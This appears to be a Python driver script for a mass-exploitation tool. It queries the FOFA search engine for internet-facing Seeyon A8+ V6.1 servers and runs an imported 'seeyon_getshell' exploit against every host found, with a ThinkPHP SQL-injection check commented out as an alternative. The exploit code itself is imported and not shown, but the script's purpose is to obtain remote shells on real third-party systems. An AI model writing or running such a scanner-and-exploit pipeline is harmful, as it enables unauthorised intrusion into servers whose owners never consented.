# !/usr/bin/env python
# coding: utf-8
# author:x1uq1n9

import GetIp
import FofaSpider
import FofaApi

# fofa查询语句
query = '''致远A8+协同管理软件 V6.1'''

# FoFaApi开关以及配置
USE_FofaApi = True
FOFA_EMAIL = ""
FOFA_KEY = ""

# 调用exp
FUNCTION = "seeyon_getshell.test(url)"
# FUNCTION = "thinkphp_view_recent_xff_sqli.thinkphp_view_recent_xff_sqli_verify(url)"

if __name__ == '__main__':
    FofaSpider.banner()
    if USE_FofaApi:
        FofaApi.FoFaApi_Action(query, FOFA_EMAIL, FOFA_KEY, FUNCTION)
    else:
        GetIp.action().IpAction(FUNCTION)